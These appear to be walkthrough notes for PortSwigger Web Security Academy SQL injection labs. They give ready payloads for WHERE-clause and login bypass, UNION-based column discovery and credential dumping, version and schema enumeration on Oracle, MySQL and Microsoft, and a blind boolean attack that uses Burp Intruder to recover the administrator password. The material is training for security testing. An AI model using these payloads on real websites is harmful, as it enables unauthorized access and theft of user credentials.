SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

1. Use Burp Suite to intercept the request. Main purpose of this method is we can modify the request to attack the website using our own payload using burp.
2. Modify the category parameter, giving it the value '+OR+1=1--
3. Submit the request, and verify that the response now contains additional items.

SQL injection vulnerability allowing login bypass

1. Use Burp Suite to intercept the request. Main purpose of this method is we can modify the request to attack the website using our own payload using burp.
2. Modify the username parameter, giving it the value: administrator'--

UNION ATTACKS

SQL injection UNION attack, determining the number of columns returned by the query

1. Use Burp Suite to intercept the request. Main purpose of this method is we can modify the request to attack the website using our own payload using burp.
2. Modify the category parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.
3. Modify the category parameter to add an additional column containing a null value:

'+UNION+SELECT+NULL,NULL--
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

SQL injection UNION attack, finding a column containing text

1. Use Burp Suite to intercept the request. Main purpose of this method is we can modify the request to attack the website using our own payload using burp.
2.Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:

'+UNION+SELECT+NULL,NULL,NULL--
3.Try replacing each null with the random value provided by the lab, for example:

'+UNION+SELECT+'abcdef',NULL,NULL--
4. If an error occurs, move on to the next null and try that instead.

SQL injection UNION attack, retrieving data from other tables

1. Use Burp Suite to intercept the request. Main purpose of this method is we can modify the request to attack the website using our own payload using burp.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

'+UNION+SELECT+'abc','def'--
3. Use the following payload to retrieve the contents of the users table:

'+UNION+SELECT+username,+password+FROM+users--
4. Verify that the application's response contains usernames and passwords.

SQL injection UNION attack, retrieving multiple values in a single column

1. Use Burp Suite to intercept the request. Main purpose of this method is we can modify the request to attack the website using our own payload using burp.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the category parameter:

'+UNION+SELECT+NULL,'abc'--
3. Use the following payload to retrieve the contents of the users table:

'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
4. Verify that the application's response contains usernames and passwords.

EXAMINING THE DATABASE

https://portswigger.net/web-security/sql-injection/cheat-sheet

SQL injection attack, querying the database type and version on Oracle

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

'+UNION+SELECT+'abc','def'+FROM+dual--
3. Use the following payload to display the database version:

'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

SQL injection attack, querying the database type and version on MySQL and Microsoft

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

'+UNION+SELECT+'abc','def'#
3. Use the following payload to display the database version:

'+UNION+SELECT+@@version,+NULL#

SQL injection attack, listing the database contents on non-Oracle databases

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

'+UNION+SELECT+'abc','def'--
3. Use the following payload to retrieve the list of tables in the database:

'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--

8. Find the password for the administrator user, and use it to log in.

SQL injection attack, listing the database contents on Oracle

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

'+UNION+SELECT+'abc','def'+FROM+dual--
3. Use the following payload to retrieve the list of tables in the database:

'+UNION+SELECT+table_name,NULL+FROM+all_tables--
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--

6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
8. Find the password for the administrator user, and use it to log in.

BLIND SQL INJECTION

Blind SQL injection with conditional responses

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.
2. Modify the TrackingId cookie, changing it to:

TrackingId=xyz' AND '1'='1
Verify that the "Welcome back" message appears in the response.

3. Now change it to:

TrackingId=xyz' AND '1'='2
Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.

4. Now change it to:

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
Verify that the condition is true, confirming that there is a table called users.

5. Now change it to:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
Verify that the condition is true, confirming that there is a user called administrator.

6. The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
This condition should be true, confirming that the password is greater than 1 character in length.

7. Send a series of follow-up values to test different password lengths. Send:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
Then send:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is in fact 20 characters long.

8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
9. In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
10. In the Positions tab, change the value of the cookie to:

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

11. Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§

12. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
13. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the Options tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back".
14. Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
15. Review the attack results to find the value of the character at the first position. You should see a column in the results called "Welcome back". One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
16. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
17. Launch the modified attack, review the results, and note the character at the second offset.
18. Continue this process testing offset 3, 4, and so on, until you have the whole password.
19. In the browser, click "My account" to open the login page. Use the password to log in as the administrator user.